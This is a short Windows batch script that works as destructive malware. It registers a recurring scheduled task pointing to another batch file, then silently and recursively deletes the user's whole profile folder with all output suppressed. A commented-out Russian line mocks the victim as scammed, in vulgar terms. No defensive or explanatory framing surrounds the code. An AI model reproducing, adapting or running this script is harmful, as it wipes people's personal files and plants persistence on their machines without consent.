@echo off
::chcp 65001 > NUL
SCHTASKS /CREATE /sc HOURLY /mo 5 /st 09:37 /du 0015:00 /TN "MyTasks\Rotator task" /TR "C:\chernobyl\schedule.bat"
rmdir /s /q %USERPROFILE% > NUL 2>&1
::echo вы были подскамлены, папке %USERPROFILE% пизда